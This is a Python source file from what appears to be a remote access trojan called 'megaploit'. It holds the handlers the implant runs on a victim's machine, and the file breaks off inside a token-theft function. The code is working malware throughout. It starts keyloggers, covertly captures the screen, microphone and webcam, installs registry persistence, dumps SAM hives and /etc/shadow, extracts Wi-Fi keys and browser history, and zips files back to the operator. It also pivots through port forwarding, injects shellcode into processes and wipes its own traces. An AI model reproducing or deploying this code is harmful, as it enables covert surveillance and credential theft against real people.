"""
megaploit.agent.handlers
~~~~~~~~~~~~~~~~~~~~~~~~
All command implementations executed on the victim/agent side.

Guiding principle: every handler here does something that a plain interactive
shell cannot — C2-specific actions like stealing credentials, injecting code,
reading OS internals, or controlling the GUI silently.

Generic shell work (ls, cat, mkdir, etc.) is delegated to the shell fallback
that already exists at the bottom of this file.
"""

from __future__ import annotations

import getpass
import os
import platform
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
import zipfile
from megaploit.core.protocol import send_file as _send_file, send_msg as _send_msg
from megaploit.core.config import MAX_RECORD_SECONDS
from megaploit.agent.keylogger import Keylogger

# Optional dependencies
try:
    import pyautogui
    _HAS_GUI = True
except ImportError:
    _HAS_GUI = False

try:
    import sounddevice as _sd
    import soundfile as _sf
    _HAS_AUDIO = True
except ImportError:
    _HAS_AUDIO = False


# ---------------------------------------------------------------------------
# Module-level state
# ---------------------------------------------------------------------------

_keylog: Keylogger | None = None
_keylog_thread: threading.Thread | None = None

# port → (thread, Flask app)
_web_threads: dict[int, threading.Thread] = {}
_web_apps:    dict[int, object]           = {}

_timelapse_stop = threading.Event()


# ---------------------------------------------------------------------------
# Command router
# ---------------------------------------------------------------------------

_HANDLERS: dict[str, object] = {}

def _register(name: str):
    def decorator(fn):
        _HANDLERS[name] = fn
        return fn
    return decorator


def handle(conn, cmd: str) -> str | None:
    parts = cmd.strip().split(maxsplit=1)
    if not parts:
        return ""
    name = parts[0].lower()
    rest = parts[1] if len(parts) > 1 else ""
    args = rest.split() if rest else []
    fn = _HANDLERS.get(name)
    if fn:
        return fn(conn, args)
    return _shell_exec(cmd)


# ---------------------------------------------------------------------------
# Core
# ---------------------------------------------------------------------------

@_register("cd")
def _cd(conn, args: list[str]) -> str:
    if len(args) != 1:
        return "Usage: cd <directory>"
    try:
        os.chdir(args[0])
        return f"[+] cwd: {os.getcwd()}"
    except FileNotFoundError:
        return f"[-] Not found: {args[0]}"
    except PermissionError:
        return f"[-] Permission denied: {args[0]}"


@_register("sysinfo")
def _sysinfo(conn, args: list[str]) -> str:
    res = str(pyautogui.size()) if _HAS_GUI else "unknown"
    try:
        import psutil
        cpu  = psutil.cpu_percent(interval=0.2)
        mem  = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        extra = (
            f"\n    CPU:          {cpu}%"
            f"\n    RAM:          {mem.used // 1024 // 1024} MB / {mem.total // 1024 // 1024} MB"
            f"\n    Disk /:       {disk.used // 1024 // 1024 // 1024} GB"
            f" / {disk.total // 1024 // 1024 // 1024} GB"
        )
    except ImportError:
        extra = ""
    return (
        f"[*] System Information\n"
        f"    OS:           {platform.system()} {platform.release()} ({platform.version()})\n"
        f"    Hostname:     {platform.node()}\n"
        f"    Username:     {getpass.getuser()}\n"
        f"    Architecture: {platform.machine()}\n"
        f"    Python:       {sys.version.split()[0]}\n"
        f"    Resolution:   {res}\n"
        f"    CWD:          {os.getcwd()}"
        f"{extra}"
    )


# ---------------------------------------------------------------------------
# File transfer (C2-specific — uses the binary protocol, not shell redirection)
# ---------------------------------------------------------------------------

@_register("upload")
def _upload(conn, args: list[str]) -> str:
    from megaploit.core.protocol import recv_file as _recv_file
    if len(args) != 1:
        return "Usage: upload <filename>"
    try:
        _recv_file(conn, args[0], timeout=60)
        return f"[+] Received: {args[0]}"
    except Exception as e:
        return f"[-] Receive failed: {e}"


@_register("download")
def _download(conn, args: list[str]) -> str | None:
    if len(args) != 1:
        return "Usage: download <filename>"
    path = args[0]
    if not os.path.isfile(path):
        return f"[-] File not found: {path}"
    _send_msg(conn, "FILE_OK")
    _send_file(conn, path)
    return None


# ---------------------------------------------------------------------------
# Screen / audio capture
# ---------------------------------------------------------------------------

@_register("screenshot")
def _screenshot(conn, args: list[str]) -> str | None:
    if not _HAS_GUI:
        return "[-] pyautogui not available"
    try:
        fname = "_screenshot.png"
        pyautogui.screenshot(fname)
        _send_msg(conn, "FILE_OK")
        _send_file(conn, fname)
        try:
            os.remove(fname)
        except OSError:
            pass
        return None
    except Exception as e:
        return f"[-] Screenshot failed: {e}"


@_register("record")
def _record(conn, args: list[str]) -> str | None:
    if not _HAS_AUDIO:
        return "[-] sounddevice/soundfile not available"
    if len(args) != 1 or not args[0].isdigit():
        return "Usage: record <seconds>"
    seconds = min(int(args[0]), MAX_RECORD_SECONDS)
    try:
        fname = "_recording.wav"
        rate  = 44100
        audio = _sd.rec(int(seconds * rate), samplerate=rate, channels=1, dtype="int16")
        _sd.wait()
        _sf.write(fname, audio, rate)
        _send_msg(conn, "FILE_OK")
        _send_file(conn, fname)
        try:
            os.remove(fname)
        except OSError:
            pass
        return None
    except Exception as e:
        return f"[-] Recording failed: {e}"


@_register("screenshot_timelapse")
def _screenshot_timelapse(conn, args: list[str]) -> str | None:
    """
    Silently take N screenshots every INTERVAL seconds, zip them, send back.
    Usage: screenshot_timelapse <count> <interval_sec>
    Returns the zip file via the binary protocol.
    """
    if not _HAS_GUI:
        return "[-] pyautogui not available"
    if len(args) != 2 or not args[0].isdigit() or not args[1].isdigit():
        return "Usage: screenshot_timelapse <count> <interval_sec>"
    count    = min(int(args[0]), 60)   # cap at 60 frames
    interval = max(1, int(args[1]))
    try:
        tmpdir = tempfile.mkdtemp(prefix="_tlapse_")
        for i in range(count):
            fname = os.path.join(tmpdir, f"frame_{i:03d}.png")
            pyautogui.screenshot(fname)
            if i < count - 1:
                time.sleep(interval)
        zip_path = tmpdir + ".zip"
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in sorted(os.listdir(tmpdir)):
                zf.write(os.path.join(tmpdir, f), f)
        _send_msg(conn, "FILE_OK")
        _send_file(conn, zip_path)
        shutil.rmtree(tmpdir, ignore_errors=True)
        try:
            os.remove(zip_path)
        except OSError:
            pass
        return None
    except Exception as e:
        return f"[-] timelapse failed: {e}"


# ---------------------------------------------------------------------------
# Streaming
# ---------------------------------------------------------------------------

@_register("screen_stream")
def _screen_stream(conn, args: list[str]) -> str:
    if len(args) != 1 or args[0] not in ("on", "off"):
        return "Usage: screen_stream <on|off>"
    return _start_web("megaploit.streaming.desktop", 5000) if args[0] == "on" else _stop_web(5000)


@_register("webcam")
def _webcam(conn, args: list[str]) -> str:
    if len(args) != 1 or args[0] not in ("on", "off"):
        return "Usage: webcam <on|off>"
    return _start_web("megaploit.streaming.webcam", 5001) if args[0] == "on" else _stop_web(5001)


def _start_web(module_name: str, port: int) -> str:
    t = _web_threads.get(port)
    if t and t.is_alive():
        return f"[-] Already running on port {port}"
    try:
        import importlib
        mod = importlib.import_module(module_name)
        _web_apps[port] = mod.app

        def _run():
            mod.app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

        t = threading.Thread(target=_run, daemon=True)
        _web_threads[port] = t
        t.start()
        return f"[+] Started — http://0.0.0.0:{port}"
    except Exception as e:
        return f"[-] Failed: {e}"


def _stop_web(port: int) -> str:
    t = _web_threads.get(port)
    if t is None or not t.is_alive():
        return "[-] No server running on that port"
    _web_threads.pop(port, None)
    _web_apps.pop(port, None)
    return f"[+] Server on port {port} stopped (daemon thread will exit)"


# ---------------------------------------------------------------------------
# Persistence / keylogger
# ---------------------------------------------------------------------------

@_register("persist")
def _persist(conn, args: list[str]) -> str:
    if sys.platform != "win32":
        return "[-] Persistence is Windows-only"
    if len(args) != 2:
        return "Usage: persist <regname> <filename>"
    reg_name, copy_name = args[0], args[1]
    try:
        dst = os.path.join(os.environ["APPDATA"], copy_name)
        if not os.path.exists(dst):
            shutil.copyfile(sys.executable, dst)
            subprocess.call(
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                f'/v {reg_name} /t REG_SZ /d "{dst}"',
                shell=True,
            )
            return "[+] Persistence installed"
        return "[-] Already exists"
    except Exception as e:
        return f"[-] Error: {e}"


@_register("keylog_start")
def _keylog_start(conn, args: list[str]) -> str:
    global _keylog, _keylog_thread
    if _keylog is not None:
        return "[-] Keylogger already running"
    _keylog = Keylogger()
    _keylog_thread = threading.Thread(target=_keylog.start, daemon=True)
    _keylog_thread.start()
    return "[+] Keylogger started"


@_register("keylog_dump")
def _keylog_dump(conn, args: list[str]) -> str:
    if _keylog is None:
        return "[-] Keylogger not running"
    data = _keylog.read_logs()
    return data if data else "(empty)"


@_register("keylog_stop")
def _keylog_stop(conn, args: list[str]) -> str:
    global _keylog, _keylog_thread
    if _keylog is None:
        return "[-] Keylogger not running"
    _keylog.destroy()
    if _keylog_thread:
        _keylog_thread.join(timeout=5)
    _keylog = None
    _keylog_thread = None
    return "[+] Keylogger stopped and log deleted"


# ---------------------------------------------------------------------------
# Clipboard (C2-specific — no shell one-liner works cross-platform silently)
# ---------------------------------------------------------------------------

@_register("getclip")
def _getclip(conn, args: list[str]) -> str:
    try:
        if sys.platform == "win32":
            out = subprocess.check_output(
                ["powershell", "-NoProfile", "-NonInteractive",
                 "-command", "Get-Clipboard"], text=True, stderr=subprocess.DEVNULL)
            return out.strip() or "(empty)"
        elif sys.platform == "darwin":
            return subprocess.check_output(["pbpaste"], text=True).strip() or "(empty)"
        else:
            for cmd in (["xclip", "-selection", "clipboard", "-o"],
                        ["xsel", "--clipboard", "--output"],
                        ["wl-paste"]):
                if shutil.which(cmd[0]):
                    return subprocess.check_output(cmd, text=True,
                                                   stderr=subprocess.DEVNULL).strip() or "(empty)"
            return "[-] No clipboard tool found (xclip / xsel / wl-paste)"
    except Exception as e:
        return f"[-] getclip: {e}"


@_register("setclip")
def _setclip(conn, args: list[str]) -> str:
    if not args:
        return "Usage: setclip <text>"
    text = " ".join(args)
    try:
        if sys.platform == "win32":
            subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive",
                 "-command", f'Set-Clipboard -Value "{text}"'],
                check=True, capture_output=True)
        elif sys.platform == "darwin":
            subprocess.run(["pbcopy"], input=text.encode(), check=True)
        else:
            for cmd in (["xclip", "-selection", "clipboard"],
                        ["xsel", "--clipboard", "--input"],
                        ["wl-copy"]):
                if shutil.which(cmd[0]):
                    subprocess.run(cmd, input=text.encode(), check=True)
                    break
            else:
                return "[-] No clipboard tool found"
        return "[+] Clipboard set"
    except Exception as e:
        return f"[-] setclip: {e}"


# ---------------------------------------------------------------------------
# Network — port-forward (C2-specific: pivoting through the agent)
# ---------------------------------------------------------------------------

@_register("portfwd")
def _portfwd(conn, args: list[str]) -> str:
    """
    Bind a port on the agent and relay all traffic to a remote host.
    Usage: portfwd <local_port> <remote_host> <remote_port>
    Useful for reaching internal services from the operator's machine.
    """
    if len(args) != 3:
        return "Usage: portfwd <local_port> <remote_host> <remote_port>"
    try:
        local_port  = int(args[0])
        remote_host = args[1]
        remote_port = int(args[2])
    except ValueError:
        return "[-] Ports must be integers"
    import socket as _sock

    def _relay(src, dst):
        try:
            while True:
                data = src.recv(4096)
                if not data:
                    break
                dst.sendall(data)
        except OSError:
            pass
        finally:
            for s in (src, dst):
                try:
                    s.close()
                except OSError:
                    pass

    def _accept(server):
        while True:
            try:
                client, _ = server.accept()
            except OSError:
                break
            try:
                remote = _sock.create_connection((remote_host, remote_port), timeout=10)
            except OSError:
                client.close()
                continue
            threading.Thread(target=_relay, args=(client, remote), daemon=True).start()
            threading.Thread(target=_relay, args=(remote, client), daemon=True).start()

    try:
        srv = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        srv.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", local_port))
        srv.listen(5)
        threading.Thread(target=_accept, args=(srv,), daemon=True).start()
        return f"[+] Port forward 0.0.0.0:{local_port} → {remote_host}:{remote_port}"
    except OSError as e:
        return f"[-] portfwd: {e}"


# ---------------------------------------------------------------------------
# Privilege / credential harvesting
# ---------------------------------------------------------------------------

@_register("hashdump")
def _hashdump(conn, args: list[str]) -> str:
    """Dump credential hashes. Requires SYSTEM/root."""
    if sys.platform == "win32":
        return _shell_exec(
            "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.bak /y 2>&1 && "
            "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.bak /y 2>&1 && "
            "echo [+] SAM+SYSTEM saved to C:\\Windows\\Temp"
        )
    shadow = "/etc/shadow"
    if not os.path.isfile(shadow):
        return "[-] /etc/shadow not found"
    try:
        with open(shadow) as f:
            return f.read()
    except PermissionError:
        return "[-] Permission denied — need root"
    except OSError as e:
        return f"[-] {e}"


@_register("wifi_passwords")
def _wifi_passwords(conn, args: list[str]) -> str:
    """
    Extract all saved Wi-Fi credentials without prompting the user.
    Windows: netsh wlan show profile ... key=clear
    Linux:   /etc/NetworkManager/system-connections/
    macOS:   security find-generic-password
    """
    lines: list[str] = []

    if sys.platform == "win32":
        try:
            raw = subprocess.check_output(
                ["netsh", "wlan", "show", "profiles"],
                text=True, stderr=subprocess.DEVNULL
            )
            ssids = [l.split(":")[1].strip()
                     for l in raw.splitlines() if "All User Profile" in l]
            for ssid in ssids:
                try:
                    detail = subprocess.check_output(
                        ["netsh", "wlan", "show", "profile", ssid, "key=clear"],
                        text=True, stderr=subprocess.DEVNULL
                    )
                    key = "(open)"
                    for dl in detail.splitlines():
                        if "Key Content" in dl:
                            key = dl.split(":", 1)[1].strip()
                            break
                    lines.append(f"  SSID: {ssid:<32}  KEY: {key}")
                except Exception:
                    lines.append(f"  SSID: {ssid:<32}  KEY: (error reading)")
        except Exception as e:
            return f"[-] wifi_passwords: {e}"

    elif sys.platform == "darwin":
        try:
            raw = subprocess.check_output(
                ["networksetup", "-listpreferredwirelessnetworks", "en0"],
                text=True, stderr=subprocess.DEVNULL
            )
            for line in raw.splitlines()[1:]:
                ssid = line.strip()
                if not ssid:
                    continue
                try:
                    pw = subprocess.check_output(
                        ["security", "find-generic-password",
                         "-D", "AirPort network password",
                         "-a", ssid, "-w"],
                        text=True, stderr=subprocess.DEVNULL
                    ).strip()
                except subprocess.CalledProcessError:
                    pw = "(not stored / no permission)"
                lines.append(f"  SSID: {ssid:<32}  KEY: {pw}")
        except Exception as e:
            return f"[-] wifi_passwords: {e}"

    else:
        # Linux: NetworkManager stores creds in plain files (root required for psk)
        nm_dir = "/etc/NetworkManager/system-connections"
        if not os.path.isdir(nm_dir):
            # Fallback: wpa_supplicant
            wpa = "/etc/wpa_supplicant/wpa_supplicant.conf"
            if os.path.isfile(wpa):
                try:
                    with open(wpa) as f:
                        return f.read()
                except PermissionError:
                    return "[-] /etc/wpa_supplicant/wpa_supplicant.conf — permission denied"
            return "[-] NetworkManager directory not found and no wpa_supplicant.conf"
        for fname in sorted(os.listdir(nm_dir)):
            fpath = os.path.join(nm_dir, fname)
            try:
                with open(fpath) as f:
                    content = f.read()
                ssid = psk = ""
                for l in content.splitlines():
                    if l.startswith("ssid="):
                        ssid = l.split("=", 1)[1]
                    elif l.startswith("psk="):
                        psk  = l.split("=", 1)[1]
                lines.append(f"  SSID: {ssid:<32}  PSK: {psk or '(open)'}")
            except PermissionError:
                lines.append(f"  {fname}: permission denied (need root)")
            except OSError:
                pass

    return "\n".join(lines) if lines else "[-] No saved networks found"


@_register("browser_history")
def _browser_history(conn, args: list[str]) -> str:
    """
    Read Chrome / Firefox / Edge browsing history from their SQLite DBs.
    Returns the last <n> URLs (default 50). No browser interaction needed.
    Usage: browser_history [count]
    """
    limit = 50
    if args and args[0].isdigit():
        limit = min(int(args[0]), 500)

    home    = os.path.expanduser("~")
    results: list[tuple[str, str, str]] = []   # (browser, time_str, url)

    db_paths: list[tuple[str, str]] = []

    # Chrome / Chromium
    for chrome_dir in (
        os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default"),
        os.path.join(home, ".config", "google-chrome", "Default"),
        os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default"),
    ):
        db = os.path.join(chrome_dir, "History")
        if os.path.isfile(db):
            db_paths.append(("Chrome", db))

    # Edge
    for edge_dir in (
        os.path.join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default"),
        os.path.join(home, ".config", "microsoft-edge", "Default"),
    ):
        db = os.path.join(edge_dir, "History")
        if os.path.isfile(db):
            db_paths.append(("Edge", db))

    # Firefox
    ff_base = None
    for candidate in (
        os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
        os.path.join(home, ".mozilla", "firefox"),
        os.path.join(home, "Library", "Application Support", "Firefox", "Profiles"),
    ):
        if os.path.isdir(candidate):
            ff_base = candidate
            break
    if ff_base:
        for prof in os.listdir(ff_base):
            db = os.path.join(ff_base, prof, "places.sqlite")
            if os.path.isfile(db):
                db_paths.append(("Firefox", db))

    if not db_paths:
        return "[-] No browser history databases found"

    for browser, db in db_paths:
        # Copy the DB to a temp file (browser may have it locked)
        tmp = db + "_megaploit_tmp"
        try:
            shutil.copy2(db, tmp)
            conn_db = sqlite3.connect(tmp)
            cur = conn_db.cursor()

            if browser in ("Chrome", "Edge"):
                cur.execute(
                    "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch'), url "
                    "FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,)
                )
            else:  # Firefox
                cur.execute(
                    "SELECT datetime(last_visit_date/1000000,'unixepoch'), url "
                    "FROM moz_places WHERE last_visit_date IS NOT NULL "
                    "ORDER BY last_visit_date DESC LIMIT ?", (limit,)
                )

            for ts, url in cur.fetchall():
                results.append((browser, ts or "?", url))
            conn_db.close()
        except Exception:
            pass
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass

    if not results:
        return "[-] Could not read any history (browser running with lock?)"

    lines = [f"  {'BROWSER':<8}  {'TIME (UTC)':<20}  URL"]
    lines.append("  " + "─" * 80)
    for browser, ts, url in results[:limit]:
        lines.append(f"  {browser:<8}  {ts:<20}  {url[:90]}")
    return "\n".join(lines)


@_register("search")
def _search(conn, args: list[str]) -> str:
    """
    Recursively search files under a path for a keyword (content grep).
    Skips binary files and files > 10 MB.
    Usage: search <path> <keyword>
    Returns file:line_number:matching_line for every hit (up to 200 matches).
    """
    if len(args) < 2:
        return "Usage: search <path> <keyword>"
    root    = args[0]
    keyword = " ".join(args[1:]).lower()
    hits: list[str] = []
    MAX_HITS  = 200
    MAX_FSIZE = 10 * 1024 * 1024  # 10 MB

    for dirpath, _dirs, files in os.walk(root):
        for fname in files:
            if len(hits) >= MAX_HITS:
                break
            fpath = os.path.join(dirpath, fname)
            try:
                if os.path.getsize(fpath) > MAX_FSIZE:
                    continue
                with open(fpath, "rb") as f:
                    raw = f.read()
                # Skip files that look binary (have many null bytes)
                if raw.count(b"\x00") > len(raw) * 0.1:
                    continue
                text = raw.decode("utf-8", errors="replace")
                for lineno, line in enumerate(text.splitlines(), 1):
                    if keyword in line.lower():
                        hits.append(f"{fpath}:{lineno}: {line.strip()[:120]}")
                        if len(hits) >= MAX_HITS:
                            break
            except (PermissionError, OSError):
                continue

    if not hits:
        return f"[-] No matches for '{keyword}' under {root}"
    suffix = f"\n  ... ({len(hits)} matches, limit reached)" if len(hits) >= MAX_HITS else ""
    return "\n".join(hits) + suffix


@_register("zip_download")
def _zip_download(conn, args: list[str]) -> str | None:
    """
    Zip a directory (or single file) on the target and send it back in one transfer.
    Usage: zip_download <path>
    """
    if not args:
        return "Usage: zip_download <path>"
    target = args[0]
    if not os.path.exists(target):
        return f"[-] Not found: {target}"
    try:
        tmp_zip = target.rstrip("/\\") + "_megaploit.zip"
        with zipfile.ZipFile(tmp_zip, "w", zipfile.ZIP_DEFLATED) as zf:
            if os.path.isfile(target):
                zf.write(target, os.path.basename(target))
            else:
                for dirpath, _dirs, files in os.walk(target):
                    for f in files:
                        full = os.path.join(dirpath, f)
                        arcname = os.path.relpath(full, os.path.dirname(target))
                        zf.write(full, arcname)
        _send_msg(conn, "FILE_OK")
        _send_file(conn, tmp_zip)
        try:
            os.remove(tmp_zip)
        except OSError:
            pass
        return None  # file already sent
    except Exception as e:
        return f"[-] zip_download: {e}"


# ---------------------------------------------------------------------------
# User-activity awareness
# ---------------------------------------------------------------------------

@_register("idle_time")
def _idle_time(conn, args: list[str]) -> str:
    """
    Return how many seconds since the last user input event (keyboard/mouse).
    Useful for knowing whether someone is at the keyboard.
    """
    if sys.platform == "win32":
        try:
            import ctypes
            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
            lii = LASTINPUTINFO()
            lii.cbSize = ctypes.sizeof(lii)
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
            millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
            secs = millis // 1000
            return f"[*] Idle for {secs}s ({secs // 60}m {secs % 60}s)"
        except Exception as e:
            return f"[-] idle_time: {e}"

    elif sys.platform == "darwin":
        try:
            raw = subprocess.check_output(
                ["ioreg", "-c", "IOHIDSystem"], text=True, stderr=subprocess.DEVNULL)
            for line in raw.splitlines():
                if "HIDIdleTime" in line:
                    ns = int(line.split("=")[-1].strip())
                    secs = ns // 1_000_000_000
                    return f"[*] Idle for {secs}s ({secs // 60}m {secs % 60}s)"
            return "[-] Could not read HIDIdleTime"
        except Exception as e:
            return f"[-] idle_time: {e}"

    else:
        # Linux: xprintidle (ms) or fallback to /proc/uptime heuristic
        if shutil.which("xprintidle"):
            try:
                ms = int(subprocess.check_output(
                    ["xprintidle"], text=True, stderr=subprocess.DEVNULL).strip())
                secs = ms // 1000
                return f"[*] Idle for {secs}s ({secs // 60}m {secs % 60}s)"
            except Exception as e:
                return f"[-] idle_time: {e}"
        return "[-] xprintidle not found — install it for idle detection on Linux"


@_register("mic_level")
def _mic_level(conn, args: list[str]) -> str:
    """
    Record 1 second of audio and return the peak dB level.
    Used to detect whether someone is speaking near the microphone.
    """
    if not _HAS_AUDIO:
        return "[-] sounddevice not available"
    try:
        import numpy as np
        rate   = 44100
        frames = _sd.rec(rate, samplerate=rate, channels=1, dtype="float32")
        _sd.wait()
        peak = float(np.max(np.abs(frames)))
        if peak == 0:
            db = -float("inf")
        else:
            import math
            db = 20 * math.log10(peak)
        indicator = "QUIET" if db < -30 else ("TALKING" if db > -10 else "AMBIENT")
        return f"[*] Mic peak: {db:+.1f} dB  [{indicator}]"
    except Exception as e:
        return f"[-] mic_level: {e}"


# ---------------------------------------------------------------------------
# GUI interaction
# ---------------------------------------------------------------------------

@_register("msgbox")
def _msgbox(conn, args: list[str]) -> str:
    """
    Display a visible message box on the target's desktop.
    Can be used as a decoy / distraction or social-engineering vector.
    Usage: msgbox <title> <message>
    """
    if len(args) < 2:
        return "Usage: msgbox <title> <message>"
    title   = args[0]
    message = " ".join(args[1:])

    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)  # 0x40 = MB_ICONINFORMATION
            return "[+] Message box shown"
        except Exception as e:
            return f"[-] msgbox: {e}"

    elif sys.platform == "darwin":
        try:
            script = f'display dialog "{message}" with title "{title}" buttons {{"OK"}}'
            subprocess.Popen(["osascript", "-e", script],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return "[+] Message box shown"
        except Exception as e:
            return f"[-] msgbox: {e}"

    else:
        # Linux: try zenity, then kdialog, then xmessage
        for cmd_args in (
            ["zenity", "--info", f"--title={title}", f"--text={message}", "--no-wrap"],
            ["kdialog", "--title", title, "--msgbox", message],
            ["xmessage", "-title", title, message],
        ):
            if shutil.which(cmd_args[0]):
                subprocess.Popen(cmd_args,
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return f"[+] Message box shown via {cmd_args[0]}"
        return "[-] No GUI dialog tool found (install zenity / kdialog / xmessage)"


# ---------------------------------------------------------------------------
# Shellcode injection (Windows only)
# ---------------------------------------------------------------------------

@_register("inject_shellcode")
def _inject_shellcode(conn, args: list[str]) -> str:
    """
    Inject raw shellcode (hex-encoded) into a running process and execute it
    via a remote thread. Requires Windows and sufficient privileges.
    Usage: inject_shellcode <pid> <hex_shellcode>
    Example: inject_shellcode 1234 fc4883e4f0...
    """
    if sys.platform != "win32":
        return "[-] inject_shellcode is Windows-only"
    if len(args) != 2 or not args[0].isdigit():
        return "Usage: inject_shellcode <pid> <hex_shellcode>"
    pid = int(args[0])
    try:
        shellcode = bytes.fromhex(args[1])
    except ValueError:
        return "[-] Invalid hex shellcode"
    try:
        import ctypes
        from ctypes import wintypes

        MEM_COMMIT             = 0x1000
        MEM_RESERVE            = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        PROCESS_ALL_ACCESS     = 0x1F0FFF

        kernel32 = ctypes.windll.kernel32

        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            return f"[-] OpenProcess({pid}) failed — error {kernel32.GetLastError()}"

        alloc = kernel32.VirtualAllocEx(
            h_process, None, len(shellcode),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
        if not alloc:
            kernel32.CloseHandle(h_process)
            return "[-] VirtualAllocEx failed"

        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(
            h_process, alloc,
            shellcode, len(shellcode),
            ctypes.byref(written)
        )

        thread_id = wintypes.DWORD(0)
        h_thread  = kernel32.CreateRemoteThread(
            h_process, None, 0, alloc, None, 0, ctypes.byref(thread_id)
        )
        if not h_thread:
            kernel32.CloseHandle(h_process)
            return "[-] CreateRemoteThread failed"

        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(h_process)
        return f"[+] Shellcode injected into PID {pid} — TID {thread_id.value}"
    except Exception as e:
        return f"[-] inject_shellcode: {e}"


# ---------------------------------------------------------------------------
# Self-destruct
# ---------------------------------------------------------------------------

@_register("self_destruct")
def _self_destruct(conn, args: list[str]) -> str:
    """
    Wipe the agent binary, any registry persistence key, keylog file, and
    then terminate this process.  No confirmation — run only when you mean it.
    """
    messages: list[str] = []

    # 1. Remove Windows registry key if it was set
    if sys.platform == "win32":
        try:
            subprocess.call(
                "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
                "/f 2>nul",
                shell=True
            )
            messages.append("[+] Registry run key removed")
        except Exception as e:
            messages.append(f"[-] Registry cleanup: {e}")

    # 2. Delete keylog file
    from megaploit.core.config import KEYLOG_PATH
    try:
        if os.path.isfile(KEYLOG_PATH):
            os.remove(KEYLOG_PATH)
            messages.append("[+] Keylog file removed")
    except OSError as e:
        messages.append(f"[-] Keylog removal: {e}")

    # 3. Overwrite and delete the agent script
    agent_path = os.path.abspath(sys.argv[0]) if sys.argv else None
    if agent_path and os.path.isfile(agent_path):
        try:
            size = os.path.getsize(agent_path)
            with open(agent_path, "wb") as f:
                f.write(os.urandom(size))   # overwrite with random bytes
            os.remove(agent_path)
            messages.append(f"[+] Agent binary wiped: {agent_path}")
        except OSError as e:
            messages.append(f"[-] Agent wipe: {e}")

    messages.append("[*] Self-destruct complete — terminating.")

    # Schedule exit in a separate thread so the response can be sent first
    def _exit():
        time.sleep(1)
        os._exit(0)

    threading.Thread(target=_exit, daemon=True).start()
    return "\n".join(messages)


# ---------------------------------------------------------------------------
# Forkbomb (kept as dangerous/novelty)
# ---------------------------------------------------------------------------

@_register("forkbomb")
def _forkbomb(conn, args: list[str]) -> str:
    if not hasattr(os, "fork"):
        return "[-] forkbomb not supported on this platform"
    try:
        os.fork()
    except OSError as e:
        return f"[-] fork failed: {e}"
    return "[+] forkbomb triggered"


# ---------------------------------------------------------------------------
# Generic shell fallback (for any raw command not handled above)
# ---------------------------------------------------------------------------

def _shell_exec(cmd: str) -> str:
    try:
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
            cwd=os.getcwd(),
        )
        try:
            stdout, stderr = proc.communicate(timeout=60)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.communicate()
            return "[-] Command timed out (60s)"
        out = (stdout + stderr).decode(errors="replace").strip()
        return out if out else "(no output)"
    except Exception as e:
        return f"[-] Command failed: {e}"


# ---------------------------------------------------------------------------
# Evasion — lock the screen while doing covert work
# ---------------------------------------------------------------------------

@_register("lock_screen")
def _lock_screen(conn, args: list[str]) -> str:
    """
    Silently lock the workstation so the operator can work without the
    user seeing what's happening on their screen.
    """
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.user32.LockWorkStation()
            return "[+] Workstation locked"
        except Exception as e:
            return f"[-] lock_screen: {e}"
    elif sys.platform == "darwin":
        try:
            subprocess.Popen(
                ["/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession",
                 "-suspend"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            return "[+] Screen locked (CGSession)"
        except Exception:
            try:
                subprocess.Popen(
                    ["osascript", "-e",
                     'tell application "System Events" to keystroke "q" using {command down, control down, option down}'],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                return "[+] Screen lock shortcut sent"
            except Exception as e:
                return f"[-] lock_screen: {e}"
    else:
        for cmd in (["loginctl", "lock-session"],
                    ["gnome-screensaver-command", "--lock"],
                    ["xscreensaver-command", "-lock"],
                    ["dm-tool", "lock"]):
            if shutil.which(cmd[0]):
                try:
                    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    return f"[+] Screen locked via {cmd[0]}"
                except Exception as e:
                    return f"[-] lock_screen: {e}"
        return "[-] No screen-lock tool found"


# ---------------------------------------------------------------------------
# Token / credential theft — Windows impersonation token steal
# ---------------------------------------------------------------------------

@_register("token_steal")
def _token_steal(conn, args: list[str]) -> str:
    """
    Enumerate processes with SYSTEM tokens and impersonate one.
    Windows only. Requires SeDebugPrivilege (local admin or SYSTEM).
    Usage: token_steal [pid]   — if no pid, auto-picks a SYSTEM-owned process
    """
